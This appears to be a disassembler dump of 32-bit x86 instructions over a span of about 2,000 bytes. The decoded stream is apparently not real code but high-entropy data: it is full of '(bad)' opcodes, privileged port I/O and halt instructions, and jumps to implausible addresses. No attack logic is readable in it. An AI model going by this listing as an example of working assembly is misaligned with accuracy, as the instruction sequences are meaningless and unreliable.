  413f42:	std    
  413f43:	pushf  
  413f44:	jnp    0x413fa8
  413f46:	and    al,0xa2
  413f48:	add    eax,0xf0c2b6a1
  413f4d:	ds xor al,0x21
  413f50:	neg    DWORD PTR [edi]
  413f52:	dec    esp
  413f53:	sub    esp,edx
  413f55:	xchg   edi,eax
  413f56:	pusha  
  413f57:	push   esi
  413f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f59:	das    
  413f5a:	mul    al
  413f5c:	jo     0x413f44
  413f5e:	aas    
  413f5f:	sbb    esp,0xd1fe0776
  413f65:	inc    edi
  413f66:	push   ebx
  413f67:	pop    edi
  413f68:	(bad)  
  413f69:	lods   al,BYTE PTR ds:[esi]
  413f6a:	lahf   
  413f6b:	lods   eax,DWORD PTR ds:[esi]
  413f6c:	xor    eax,0xbdce985a
  413f71:	and    al,0xe7
  413f73:	imul   ecx,DWORD PTR [edx],0xffffffa5
  413f76:	jecxz  0x413f91
  413f78:	outs   dx,BYTE PTR ds:[esi]
  413f79:	out    0x1,eax
  413f7b:	test   BYTE PTR [ecx],bl
  413f7d:	outs   dx,BYTE PTR ds:[esi]
  413f7e:	hlt    
  413f7f:	test   eax,0x51ce3961
  413f84:	cmp    DWORD PTR [ebx],0x22
  413f87:	ins    DWORD PTR es:[edi],dx
  413f88:	cmc    
  413f89:	fs xchg ebp,eax
  413f8b:	repz inc esi
  413f8d:	sahf   
  413f8e:	sub    DWORD PTR [eax-0x218a4a23],ebx
  413f94:	pop    ebp
  413f95:	mov    ebp,0xc380c8a8
  413f9a:	pop    ecx
  413f9b:	mov    bh,0xa9
  413f9d:	sub    DWORD PTR [esi-0x2647deca],0xa8b33886
  413fa7:	dec    esp
  413fa8:	mov    eax,ds:0xc26eafe5
  413fad:	pop    ds
  413fae:	mov    ?,WORD PTR [edx-0x6b]
  413fb1:	(bad)  
  413fb2:	aad    0x29
  413fb4:	push   es
  413fb5:	popf   
  413fb6:	jle    0x413f52
  413fb8:	into   
  413fb9:	add    BYTE PTR [ecx],bl
  413fbb:	cmp    al,0x53
  413fbd:	xor    BYTE PTR [eax-0x56fef9da],bl
  413fc3:	push   esp
  413fc4:	repnz xor ebp,DWORD PTR [eax+0x7e]
  413fc8:	jmp    FWORD PTR [edx]
  413fca:	inc    ecx
  413fcb:	je     0x413fb8
  413fcd:	xlat   BYTE PTR ds:[ebx]
  413fce:	shl    ebx,1
  413fd0:	jle    0x413f94
  413fd2:	mov    edi,0x873e1c4f
  413fd7:	lods   al,BYTE PTR ds:[esi]
  413fd8:	(bad)  
  413fd9:	xor    DWORD PTR [ebx-0x700fb001],edx
  413fdf:	psubq  mm4,mm6
  413fe2:	dec    ebp
  413fe3:	sti    
  413fe4:	out    dx,al
  413fe5:	loope  0x414011
  413fe7:	xchg   esi,eax
  413fe8:	mov    esi,0x9bf354cd
  413fed:	mov    eax,ds:0x3ffd5f3e
  413ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ff3:	cmp    eax,0xf1d5ab0b
  413ff8:	retf   
  413ff9:	cld    
  413ffa:	mov    ah,0x15
  413ffc:	mov    esp,0xd2667ac4
  414001:	fisub  WORD PTR [ebx]
  414003:	inc    edx
  414004:	test   BYTE PTR [ecx-0x266186fe],0xc6
  41400b:	sbb    BYTE PTR [eax],ch
  41400d:	sub    esp,DWORD PTR gs:[ebx-0x4d820efe]
  414014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414015:	and    esi,DWORD PTR [ebx+edx*8+0x1ffb8faf]
  41401c:	adc    edi,DWORD PTR [ebx-0x21215c26]
  414022:	out    0xfc,eax
  414024:	dec    edx
  414025:	pop    eax
  414026:	(bad)  
  414027:	bound  esp,QWORD PTR [edi]
  414029:	jno    0x413fdc
  41402b:	dec    eax
  41402c:	gs clc 
  41402e:	adc    BYTE PTR [esi-0x5da7326c],bl
  414034:	pop    ss
  414035:	sahf   
  414036:	outs   dx,BYTE PTR ds:[esi]
  414037:	mov    esp,0xcc8760f7
  41403c:	push   edx
  41403d:	mov    ch,0x8d
  41403f:	sub    DWORD PTR [esi+0x22a34b19],edx
  414045:	mov    ah,0xe8
  414047:	(bad)  
  414048:	scas   al,BYTE PTR es:[edi]
  414049:	fimul  DWORD PTR [eax+ebx*4]
  41404c:	xchg   DWORD PTR [edx],esp
  41404e:	lea    ebx,[edx]
  414050:	mov    al,0x19
  414052:	dec    edi
  414053:	pusha  
  414054:	rcr    BYTE PTR [eax-0x44ca9413],1
  41405a:	popf   
  41405b:	jnp    0x41407b
  41405d:	xchg   ebp,eax
  41405e:	loop   0x414026
  414060:	jecxz  0x4140df
  414062:	cmp    al,bh
  414064:	sbb    eax,0x5af28253
  414069:	xor    ch,BYTE PTR [edx-0x634b4217]
  41406f:	call   0x5f294f33
  414074:	pop    esi
  414075:	sbb    ah,al
  414077:	(bad)  
  414078:	popf   
  414079:	dec    esp
  41407a:	push   ss
  41407b:	imul   edi,DWORD PTR [edx+0x2d],0xb607b1cd
  414082:	out    0xf8,al
  414084:	mov    eax,ds:0xde386c71
  414089:	mov    al,0x64
  41408b:	inc    esp
  41408c:	enter  0xa07a,0x29
  414090:	hlt    
  414091:	mov    ebx,0x54bac3aa
  414096:	js     0x414109
  414098:	adc    eax,0xa26494a0
  41409d:	ret    
  41409e:	stos   DWORD PTR es:[edi],eax
  41409f:	cmp    edx,ebp
  4140a1:	sub    ecx,ecx
  4140a3:	fucomp st(4)
  4140a5:	xchg   ebx,eax
  4140a6:	fwait
  4140a7:	(bad)  
  4140a9:	std    
  4140aa:	or     dh,BYTE PTR [ebx-0x38]
  4140ad:	int    0xd2
  4140af:	pop    ss
  4140b0:	push   eax
  4140b1:	popf   
  4140b2:	in     eax,dx
  4140b3:	stc    
  4140b4:	add    eax,DWORD PTR [esi]
  4140b6:	inc    ebp
  4140b7:	mov    WORD PTR [edx],ss
  4140b9:	retf   0xa317
  4140bc:	mov    ah,0xac
  4140be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140bf:	pop    ss
  4140c0:	and    BYTE PTR [edx+0x12],bh
  4140c3:	das    
  4140c4:	sbb    eax,0x3d28b829
  4140c9:	in     al,0xf0
  4140cb:	or     DWORD PTR [edx+0x2f31c039],ecx
  4140d1:	iret   
  4140d2:	out    dx,al
  4140d3:	outs   dx,BYTE PTR ds:[esi]
  4140d4:	cmp    eax,0xcb2dd9c3
  4140d9:	dec    edx
  4140da:	adc    edi,DWORD PTR [edi-0x5f]
  4140dd:	xor    dl,bh
  4140df:	into   
  4140e0:	pop    edi
  4140e1:	gs cld 
  4140e3:	(bad)  
  4140e4:	call   0x8bbb09fe
  4140e9:	pop    es
  4140ea:	adc    edx,DWORD PTR [edi]
  4140ec:	jae    0x41416d
  4140ee:	jle    0x414095
  4140f0:	or     eax,0x3a300cc7
  4140f5:	jl     0x4140d3
  4140f7:	dec    edx
  4140f8:	or     edx,DWORD PTR [ecx+0x2e]
  4140fb:	cld    
  4140fc:	das    
  4140fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140fe:	push   esi
  4140ff:	or     ax,0xedd
  414103:	xor    BYTE PTR [edi+0x442810dc],ah
  414109:	sbb    cl,BYTE PTR [ebp-0x7a46fe2c]
  41410f:	icebp  
  414110:	adc    BYTE PTR [eax+0x1a],ch
  414113:	iret   
  414114:	stos   BYTE PTR es:[edi],al
  414115:	mov    dl,BYTE PTR [ecx]
  414117:	push   ds
  414118:	and    eax,0x52d79e48
  41411d:	and    al,0x87
  41411f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414120:	inc    ebx
  414121:	inc    ebx
  414122:	pop    ebp
  414123:	shl    DWORD PTR [ebx],cl
  414125:	xchg   edi,eax
  414126:	das    
  414127:	cmc    
  414128:	adc    al,bh
  41412a:	fbstp  TBYTE PTR [ebp+0x770d0260]
  414130:	(bad)  [eax-0x3f]
  414133:	xchg   DWORD PTR [ecx],edx
  414135:	add    ah,dh
  414137:	jp     0x41418d
  414139:	out    0x82,al
  41413b:	xor    edx,0x4a
  41413e:	fisub  WORD PTR [ebx+0x7d6c0f97]
  414144:	sar    esi,cl
  414146:	jle    0x414134
  414148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414149:	adc    ch,BYTE PTR [edi-0x45]
  41414c:	nop
  41414d:	sub    al,0xd9
  41414f:	mov    eax,ds:0x9ef267c7
  414154:	mov    ah,BYTE PTR [ebx+0x1f]
  414157:	push   ss
  414158:	push   ds
  414159:	fst    DWORD PTR [edi+ebx*8]
  41415c:	add    bh,BYTE PTR [edi+0x3f]
  41415f:	enter  0x6fe3,0x42
  414163:	pop    ebp
  414164:	xchg   ecx,eax
  414165:	and    dh,BYTE PTR [eax+0xcbb9064]
  41416b:	fsubp  st(3),st
  41416d:	mov    esi,0xf41deee9
  414172:	imul   esi,DWORD PTR [eax-0x34],0x74469a7d
  414179:	enter  0xc442,0xf6
  41417d:	cs repnz hlt 
  414180:	jnp    0x4141db
  414182:	mov    al,ds:0x6d9cc2c7
  414187:	or     eax,0xd37c441b
  41418c:	fnstsw WORD PTR [eax-0x5c]
  41418f:	daa    
  414190:	outs   dx,BYTE PTR ds:[esi]
  414191:	(bad)  
  414192:	clc    
  414193:	fidiv  DWORD PTR [edx-0x67]
  414196:	je     0x41419a
  414198:	das    
  414199:	or     dl,0xbc
  41419c:	sub    ah,BYTE PTR [eax]
  41419e:	mov    ah,0x15
  4141a0:	test   BYTE PTR [ebx],dh
  4141a2:	aam    0xb6
  4141a4:	jge    0x4141da
  4141a6:	inc    edx
  4141a7:	int3   
  4141a8:	fdivr  st,st(0)
  4141aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ab:	inc    ebp
  4141ac:	aad    0x60
  4141ae:	leave  
  4141af:	adc    al,0x5d
  4141b1:	loope  0x4141b4
  4141b3:	dec    ebx
  4141b4:	stos   DWORD PTR es:[edi],eax
  4141b5:	inc    edi
  4141b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141b7:	mov    dh,0x74
  4141b9:	das    
  4141ba:	or     eax,0x3369a09c
  4141bf:	cmc    
  4141c0:	aad    0xc5
  4141c2:	pop    ds
  4141c3:	in     eax,0x1c
  4141c5:	retf   0x5aa5
  4141c8:	(bad)  
  4141c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141ca:	inc    esi
  4141cb:	xor    DWORD PTR [eax-0x28],edi
  4141ce:	(bad)  
  4141d0:	(bad)  
  4141d1:	retf   0xbe95
  4141d4:	les    esp,FWORD PTR [edx-0x61]
  4141d7:	sti    
  4141d8:	bound  edi,QWORD PTR [ebp+ecx*4+0x66]
  4141dc:	mov    al,ds:0x2c8c4021
  4141e1:	fistp  QWORD PTR [esi+0x5a]
  4141e4:	and    al,0x9c
  4141e6:	mov    ah,0xaa
  4141e8:	scas   al,BYTE PTR es:[edi]
  4141e9:	push   edi
  4141ea:	fs js  0x414189
  4141ed:	xchg   BYTE PTR [ecx],bl
  4141ef:	neg    BYTE PTR [ebx+0x6924ff7e]
  4141f5:	stos   DWORD PTR es:[edi],eax
  4141f6:	inc    esi
  4141f7:	pushf  
  4141f8:	inc    ecx
  4141f9:	(bad)  
  4141fa:	or     eax,DWORD PTR [ecx-0x2efbfc9a]
  414200:	pop    esi
  414201:	jmp    0x384bbaae
  414206:	mov    esp,0xa4c1d7e8
  41420b:	mov    dh,0xb0
  41420d:	push   ebx
  41420e:	sbb    edx,DWORD PTR [edi+0x12]
  414211:	(bad)  
  414212:	mov    eax,0x8216eb28
  414217:	jp     0x41427c
  414219:	and    al,0x2e
  41421b:	lock dec edi
  41421d:	pop    esp
  41421e:	in     eax,0xb0
  414220:	jno    0x41423e
  414222:	xchg   DWORD PTR [edx],ebp
  414224:	fidivr WORD PTR [edx+0x49f92cd5]
  41422a:	js     0x414280
  41422c:	hlt    
  41422d:	in     al,dx
  41422e:	xor    ebp,DWORD PTR [ecx]
  414230:	sub    esi,DWORD PTR ds:0x2ed27380
  414236:	fcmovnu st,st(2)
  414238:	ffreep st(6)
  41423a:	xor    DWORD PTR [edi],edx
  41423c:	cs ins BYTE PTR es:[edi],dx
  41423e:	mov    ds:0x60cdcec7,eax
  414243:	xor    DWORD PTR [ebx+0x1c],esi
  414246:	push   ecx
  414247:	pop    ss
  414248:	pop    edx
  414249:	adc    edi,DWORD PTR [ecx-0x7252f549]
  41424f:	inc    ecx
  414250:	cli    
  414251:	pop    esp
  414252:	retf   0x4481
  414255:	sbb    eax,0xc4ccff6b
  41425a:	inc    ecx
  41425b:	dec    ecx
  41425c:	jne    0x41421a
  41425e:	stos   DWORD PTR es:[edi],eax
  41425f:	fwait
  414260:	ret    0xfafa
  414263:	ds mov ah,0xfc
  414266:	pop    esp
  414267:	push   ebp
  414268:	imul   edi,DWORD PTR [edi+eax*8+0x3c],0x1288e320
  414270:	dec    ecx
  414271:	mov    ds:0xafbdfdf9,al
  414276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414277:	xchg   esp,eax
  414278:	les    ebx,FWORD PTR gs:[ebp+esi*4+0x7f]
  41427d:	repnz scas eax,DWORD PTR es:[edi]
  41427f:	lods   eax,DWORD PTR ds:[esi]
  414280:	adc    bh,dh
  414282:	pop    edi
  414283:	xor    dh,BYTE PTR [esi-0x2f]
  414286:	clc    
  414287:	stos   DWORD PTR es:[edi],eax
  414288:	addr16 repnz or al,0x0
  41428c:	inc    eax
  41428d:	xchg   ecx,eax
  41428e:	dec    ebp
  41428f:	out    0xf8,al
  414291:	(bad)  
  414292:	jmp    0xe6cdda3
  414297:	jne    0x4142ab
  414299:	mov    dl,0x8f
  41429b:	rol    DWORD PTR [ebp-0x10bb7bc],0xa7
  4142a2:	and    eax,DWORD PTR [ebp+0x0]
  4142a5:	jae    0x414251
  4142a7:	lahf   
  4142a8:	(bad)  
  4142a9:	fistp  DWORD PTR [eax]
  4142ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142ac:	outs   dx,BYTE PTR ds:[esi]
  4142ad:	lea    ebx,[esi+0x59]
  4142b0:	mov    DWORD PTR ds:0x26b9167e,esp
  4142b6:	fsubr  st(1),st
  4142b8:	xchg   esp,eax
  4142b9:	jb     0x41427d
  4142bb:	shl    edx,1
  4142bd:	or     edi,DWORD PTR [esi-0x7b3c3909]
  4142c3:	push   0xffffffb7
  4142c5:	mov    edi,0x225af6ce
  4142ca:	inc    esi
  4142cb:	stc    
  4142cc:	ret    
  4142cd:	add    BYTE PTR [ebp+0x4f],bl
  4142d0:	xchg   esi,eax
  4142d1:	(bad)  [ecx]
  4142d3:	or     eax,0xc1357e2d
  4142d8:	dec    ebx
  4142d9:	add    eax,0xa71dc2ab
  4142de:	gs sti 
  4142e0:	and    BYTE PTR [ebp-0x62],0x8e
  4142e4:	mov    ebp,0x1ac38ed
  4142e9:	pusha  
  4142ea:	add    eax,DWORD PTR [ebp+0x11]
  4142ed:	sub    DWORD PTR [eax+0x47b51063],ecx
  4142f3:	and    DWORD PTR [ebx-0x169e589c],0x47
  4142fa:	ins    BYTE PTR es:[edi],dx
  4142fb:	add    ebx,0xa293aa6d
  414301:	add    BYTE PTR [edx+edi*1-0x64],0xb6
  414306:	aas    
  414307:	add    eax,0x4b6b12cb
  41430c:	nop
  41430d:	pusha  
  41430e:	and    eax,0x30369a9c
  414313:	(bad)  
  414314:	aad    0x1b
  414316:	sub    eax,0x19f2bd7d
  41431b:	(bad)  [edx+0x28312dc4]
  414321:	cli    
  414322:	mov    ebp,0x459130e3
  414327:	xchg   BYTE PTR [ebx+ebp*1],dl
  41432a:	ror    DWORD PTR [edx+0x6b],1
  41432d:	xor    ch,BYTE PTR [ebx+0x1a]
  414330:	cmp    eax,0x6792f4ce
  414335:	dec    ecx
  414336:	sbb    BYTE PTR [ebp-0x2a],bl
  414339:	adc    BYTE PTR [ecx+esi*1],ch
  41433c:	rcl    DWORD PTR [eax-0x39],0x75
  414340:	mov    edx,0x6ac3e9c9
  414345:	ins    DWORD PTR es:[edi],dx
  414346:	int3   
  414347:	pushf  
  414348:	fs aas 
  41434a:	jle    0x414307
  41434c:	adc    bh,BYTE PTR es:[esp+edx*1]
  414350:	shl    BYTE PTR [ebx],0x71
  414353:	and    DWORD PTR [edx+0x5038d413],esi
  414359:	iret   
  41435a:	inc    edx
  41435b:	stos   DWORD PTR es:[edi],eax
  41435c:	sbb    eax,0x88242100
  414361:	push   edi
  414362:	cli    
  414363:	push   ebx
  414364:	and    ebp,DWORD PTR [ebx+0x159e10ae]
  41436a:	call   0xdf51b6a1
  41436f:	cmp    cl,BYTE PTR ds:[edx]
  414372:	in     al,dx
  414373:	shld   ebp,ecx,cl
  414376:	pop    ebp
  414377:	sub    BYTE PTR [ebx-0x33],bl
  41437a:	cmp    bl,BYTE PTR [eax]
  41437c:	add    eax,0x8e9e0f82
  414381:	adc    ah,BYTE PTR [ebx]
  414383:	shl    DWORD PTR [edx+0x44],cl
  414386:	cmp    eax,edi
  414388:	out    0x8f,al
  41438a:	mov    esi,0xe8f0e565
  41438f:	cmc    
  414390:	mov    edi,0xce995a54
  414395:	cmp    ah,bl
  414397:	retf   0x608a
  41439a:	and    DWORD PTR [ebx-0x753c9cbb],eax
  4143a0:	cdq    
  4143a1:	into   
  4143a2:	cmc    
  4143a3:	(bad)  
  4143a4:	mul    eax
  4143a6:	or     dl,cl
  4143a8:	stos   DWORD PTR es:[edi],eax
  4143a9:	jle    0x41436b
  4143ab:	jle    0x414361
  4143ad:	int    0x87
  4143af:	xlat   BYTE PTR ds:[ebx]
  4143b0:	scas   eax,DWORD PTR es:[edi]
  4143b1:	cmc    
  4143b2:	mov    ds:0xafb95197,eax
  4143b7:	inc    ebp
  4143b8:	jo     0x41436d
  4143ba:	pop    es
  4143bb:	(bad)  [ebx]
  4143bd:	and    ecx,edi
  4143bf:	ins    DWORD PTR es:[edi],dx
  4143c0:	and    ebx,esi
  4143c2:	out    dx,al
  4143c3:	dec    edx
  4143c4:	adc    eax,0x3621b617
  4143c9:	jne    0x41435c
  4143cb:	push   edi
  4143cc:	sub    al,0x95
  4143ce:	mov    esi,0x49fe841a
  4143d3:	dec    eax
  4143d4:	out    dx,eax
  4143d5:	outs   dx,BYTE PTR ds:[esi]
  4143d6:	sub    eax,0x3d9604c
  4143db:	push   es
  4143dc:	stos   DWORD PTR es:[edi],eax
  4143dd:	mov    dh,0x3a
  4143df:	jmp    0x4143e2
  4143e1:	xchg   ebp,eax
  4143e2:	mov    eax,ds:0x9cdea695
  4143e7:	add    eax,0x8a595433
  4143ec:	(bad)  
  4143ed:	imul   edx,DWORD PTR [ebx-0x2],0x3f
  4143f1:	(bad)  
  4143f2:	mov    al,ds:0x577575fe
  4143f7:	sub    bh,ch
  4143f9:	mov    ah,BYTE PTR [edx]
  4143fb:	sbb    al,0x44
  4143fd:	mov    cl,0x8f
  4143ff:	rcl    BYTE PTR [edi+eiz*4],0x6c
  414403:	out    0xa4,eax
  414405:	mov    edi,0x8104232e
  41440a:	adc    al,0x85
  41440c:	int    0xdc
  41440e:	pushf  
  41440f:	gs mov ah,0xda
  414412:	ret    
  414413:	push   ds
  414414:	and    BYTE PTR [ebx+0x2195a444],bl
  41441a:	retf   
  41441b:	leave  
  41441c:	mul    DWORD PTR [edx]
  41441e:	rcl    DWORD PTR [esi],cl
  414420:	cmp    dl,BYTE PTR [ecx]
  414422:	sub    BYTE PTR [ebp+ebp*4+0x64],al
  414426:	mov    ch,ah
  414428:	push   cs
  414429:	jmp    0x1d4b585d
  41442e:	mov    DWORD PTR [edx],edi
  414430:	pop    eax
  414431:	loopne 0x4143ed
  414433:	dec    edi
  414434:	sbb    eax,0x23eb53f3
  414439:	xchg   esi,eax
  41443a:	mov    edi,0xc1292188
  41443f:	pop    ecx
  414440:	jno    0x414482
  414442:	pop    esp
  414443:	test   BYTE PTR [edx-0x25],dl
  414446:	stc    
  414447:	mov    bh,0x8c
  414449:	mov    bh,0xa3
  41444b:	and    eax,0x653e4f7b
  414450:	es mov bl,0xad
  414453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414454:	push   0xaf7c7aa7
  414459:	xor    edi,ecx
  41445b:	mov    bh,0x9d
  41445d:	lods   eax,DWORD PTR ds:[esi]
  41445e:	pop    eax
  41445f:	in     al,dx
  414460:	jns    0x41449b
  414462:	fadd   st(5),st
  414464:	outs   dx,BYTE PTR ds:[esi]
  414465:	jecxz  0x414486
  414467:	mov    dh,BYTE PTR [esi]
  414469:	adc    dh,dh
  41446b:	xor    eax,0xbbb1a636
  414470:	int    0x36
  414472:	and    DWORD PTR [ebx+0x16],esi
  414475:	es js  0x4144ed
  414478:	push   ebx
  414479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41447a:	push   es
  41447b:	daa    
  41447c:	fdivrp st(4),st
  41447e:	lods   al,BYTE PTR ds:[esi]
  41447f:	mov    ebx,0xb247cc5c
  414484:	out    0x35,eax
  414486:	mov    bh,BYTE PTR ds:0x4d154e61
  41448c:	add    ch,dh
  41448e:	xchg   ecx,ecx
  414490:	mov    esp,0xcd3d5a94
  414495:	jp     0x41448a
  414497:	stos   BYTE PTR es:[edi],al
  414498:	jns    0x41447a
  41449a:	aas    
  41449b:	repz div DWORD PTR [eax-0x36]
  41449f:	or     eax,0x5a62fedf
  4144a4:	leave  
  4144a5:	sti    
  4144a6:	imul   ebp,DWORD PTR [esp+ecx*8+0x1b],0xb8089f35
  4144ae:	jb     0x4144e0
  4144b0:	fist   WORD PTR [edi-0x67]
  4144b3:	cmp    dh,ah
  4144b5:	int    0xef
  4144b7:	jecxz  0x414514
  4144b9:	test   dh,cl
  4144bb:	outs   dx,BYTE PTR ds:[esi]
  4144bc:	test   BYTE PTR [edx],dh
  4144be:	xchg   edi,eax
  4144bf:	xchg   edi,eax
  4144c0:	popf   
  4144c1:	inc    eax
  4144c2:	inc    eax
  4144c3:	sbb    eax,DWORD PTR [esi+0x7989922c]
  4144c9:	jb     0x4144c9
  4144cb:	xchg   DWORD PTR ds:0x2c76f874,eax
  4144d1:	les    ebp,FWORD PTR [esp+edx*1-0x2c]
  4144d5:	jae    0x414489
  4144d7:	mov    al,ds:0xee7dd22a
  4144dc:	push   edi
  4144dd:	add    eax,esi
  4144df:	(bad)  
  4144e0:	cmp    BYTE PTR [edx-0x25],al
  4144e3:	xor    al,0x6e
  4144e5:	mov    ds:0xee243a85,al
  4144ea:	in     al,0x2c
  4144ec:	jno    0x414522
  4144ee:	loopne 0x4144aa
  4144f0:	jb     0x414571
  4144f2:	jg     0x414560
  4144f4:	out    dx,eax
  4144f5:	ret    
  4144f6:	mov    cl,0x4c
  4144f8:	loopne 0x414541
  4144fa:	pop    ss
  4144fb:	mov    dl,0x77
  4144fd:	daa    
  4144fe:	or     eax,0x204c7e16
  414503:	jmp    0x13e3:0x73cfc669
  41450a:	add    eax,0x11772ffa
  41450f:	dec    ebx
  414510:	sbb    al,0xd7
  414512:	dec    ebx
  414513:	dec    ebx
  414514:	sub    esi,DWORD PTR [esi+0x63]
  414517:	push   0xffffff87
  414519:	imul   esp,DWORD PTR [ebx+0x13f2c9d2],0xffffffc7
  414520:	or     al,0x32
  414522:	setb   BYTE PTR [esi-0x7481d64a]
  414529:	mov    ecx,0xea4820f5
  41452e:	xchg   ah,ah
  414530:	cmp    bl,BYTE PTR [eax]
  414532:	mov    al,ds:0xc0d2773b
  414537:	out    dx,al
  414538:	inc    edx
  414539:	or     ebx,DWORD PTR [ebx-0x2e]
  41453c:	pop    es
  41453d:	sub    BYTE PTR es:[eax],ah
  414540:	mov    edi,0x1c462a0d
  414545:	inc    DWORD PTR [esi]
  414547:	aas    
  414548:	(bad)
  41454c:	mov    ch,0x18
  41454e:	sub    DWORD PTR [eax],ebp
  414550:	sbb    DWORD PTR [esp+edi*4],ecx
  414553:	sbb    BYTE PTR [edi],dh
  414555:	(bad)  
  414556:	int    0xab
  414558:	xor    DWORD PTR [esi+0x7d0e6924],esp
  41455e:	xchg   esp,eax
  41455f:	mov    ebp,0x99f0c346
  414564:	cmp    ch,BYTE PTR [ebx+0x7038eccf]
  41456a:	mov    ch,0x99
  41456c:	sti    
  41456d:	jno    0x414518
  41456f:	push   0x3d
  414571:	ret    
  414572:	out    0x44,al
  414574:	daa    
  414575:	cld    
  414576:	sbb    al,0xea
  414578:	(bad)  
  41457a:	test   ecx,edx
  41457c:	stc    
  41457d:	icebp  
  41457e:	push   ss
  41457f:	shr    edi,0x13
  414582:	jb     0x4145cf
  414584:	cli    
  414585:	fimul  WORD PTR [esi+0x5c]
  414588:	dec    edi
  414589:	inc    edx
  41458a:	int    0x24
  41458c:	out    dx,eax
  41458d:	sar    BYTE PTR [ecx-0x356f605c],0x56
  414594:	mov    bh,0x1d
  414596:	sbb    ch,BYTE PTR [ecx+0xb]
  414599:	ret    
  41459a:	mov    dh,0xd1
  41459c:	dec    ebx
  41459d:	sahf   
  41459e:	daa    
  41459f:	dec    ecx
  4145a0:	dec    edi
  4145a1:	and    DWORD PTR [esi],ecx
  4145a3:	sub    DWORD PTR [ebx+0x1],edx
  4145a6:	and    DWORD PTR [edi+ebp*1-0x1],eax
  4145aa:	mov    ds:0x386fa38f,eax
  4145af:	test   ebp,eax
  4145b1:	fidivr WORD PTR [esi-0x48]
  4145b4:	mov    eax,ds:0x254eaa28
  4145b9:	push   edx
  4145ba:	push   ebp
  4145bb:	leave  
  4145bc:	inc    edi
  4145bd:	mov    al,ds:0x12da3a1a
  4145c2:	outs   dx,BYTE PTR ds:[esi]
  4145c3:	test   al,0x9f
  4145c5:	fcomp  st(1)
  4145c7:	sti    
  4145c8:	(bad)  
  4145c9:	js     0x4145b3
  4145cb:	push   cs
  4145cc:	jb     0x4145fd
  4145ce:	add    eax,0x91d5d59c
  4145d3:	pop    ds
  4145d4:	mov    eax,0x46e275e8
  4145d9:	aaa    
  4145da:	mov    ds:0xd3b78eab,eax
  4145df:	scas   eax,DWORD PTR es:[edi]
  4145e0:	cmp    al,0x2b
  4145e2:	pop    ecx
  4145e3:	mov    dl,0x5a
  4145e5:	add    BYTE PTR [edi],ch
  4145e7:	arpl   WORD PTR [eax+0x4f],sp
  4145ea:	loope  0x4145a1
  4145ec:	fidivr WORD PTR [ebp+0x582cd466]
  4145f2:	xchg   esi,eax
  4145f3:	pop    esp
  4145f4:	outs   dx,DWORD PTR ds:[esi]
  4145f5:	jmp    0xc94f7686
  4145fa:	not    BYTE PTR [ebp+0x2be10f4c]
  414600:	mov    eax,ds:0x55bec4eb
  414605:	pop    esi
  414606:	adc    edi,ecx
  414608:	ins    BYTE PTR es:[edi],dx
  414609:	xchg   ecx,eax
  41460a:	cmp    DWORD PTR [eax+0x48],ebp
  41460d:	or     ebp,DWORD PTR [edi+0x1b]
  414610:	pushf  
  414611:	fst    QWORD PTR ds:0xf344f6a3
  414617:	mov    esp,0xb4226d9
  41461c:	pop    edx
  41461d:	stos   BYTE PTR es:[edi],al
  41461e:	les    esp,FWORD PTR [eax]
  414620:	cli    
  414621:	or     edi,DWORD PTR [edi+ecx*1]
  414624:	xchg   esi,eax
  414625:	jbe    0x414643
  414627:	mov    ebx,0xbbb55b2b
  41462c:	ror    BYTE PTR [eax],0x42
  41462f:	fsub   QWORD PTR [ebx+0x34]
  414632:	sti    
  414633:	arpl   WORD PTR [ebp-0x1e],ax
  414636:	addr16 (bad) 
  414638:	add    al,0xb
  41463a:	mov    ch,0x52
  41463c:	imul   ecx,DWORD PTR [ebp-0x57],0x72
  414640:	and    eax,0x9110b655
  414645:	pop    edi
  414646:	lds    ecx,FWORD PTR [ebp+ecx*4-0x75]
  41464a:	loope  0x41465b
  41464c:	int3   
  41464d:	xchg   esi,eax
  41464e:	mov    dh,0x52
  414650:	ret    0xd27d
  414653:	jmp    0x99364de
  414658:	mov    eax,edi
  41465a:	and    esi,ebx
  41465c:	ds int 0x83
  41465f:	cdq    
  414660:	lock shl eax,1
  414663:	push   ebp
  414664:	(bad)  
  414665:	out    dx,al
  414666:	xor    DWORD PTR [edx+0x14a3bf83],ecx
  41466c:	push   es
  41466d:	and    al,0x78
  41466f:	jb     0x41469d
  414671:	dec    edi
  414672:	mov    dl,0x84
  414674:	imul   esi,DWORD PTR [ebx+0xf],0xb09f3403
  41467b:	das    
  41467c:	mov    esp,0xa0b20d67
  414681:	test   eax,0x1d60bd79
  414686:	aas    
  414687:	mov    eax,0x4e81d9b4
  41468c:	jbe    0x41465e
  41468e:	jg     0x41467f
  414690:	mov    ah,0xd2
  414692:	pop    esp
  414693:	jae    0x4146cf
  414695:	neg    BYTE PTR [esi]
  414697:	imul   BYTE PTR [edx-0x3b0b1525]
  41469d:	xchg   BYTE PTR [edi+0x2b228e18],al
  4146a3:	jmp    0xe5c1:0x16e01abe
  4146aa:	pushf  
  4146ab:	xchg   ebx,eax
  4146ac:	idiv   DWORD PTR [edi+0x41]
  4146af:	add    DWORD PTR [esi],esp
  4146b1:	enter  0x54c3,0xfd
  4146b5:	gs call 0xafd76ee
  4146bb:	dec    ebp
  4146bc:	int3   
  4146bd:	push   ds
  4146be:	xchg   esp,eax
  4146bf:	loopne 0x414675
  4146c1:	and    DWORD PTR [esi+0x43e644b9],0x58
  4146c8:	and    DWORD PTR [ecx],0x230e1428
  4146ce:	jbe    0x4146ea
  4146d0:	push   0x8fd39cc9
  4146d5:	xchg   edx,edx
  4146d7:	pusha  
  4146d8:	add    eax,0xdc7abbdb
  4146dd:	dec    edi
  4146de:	sbb    DWORD PTR [esi],esi
  4146e0:	repnz icebp 
  4146e2:	fld    QWORD PTR [ebx]
  4146e4:	mov    dl,0x8c
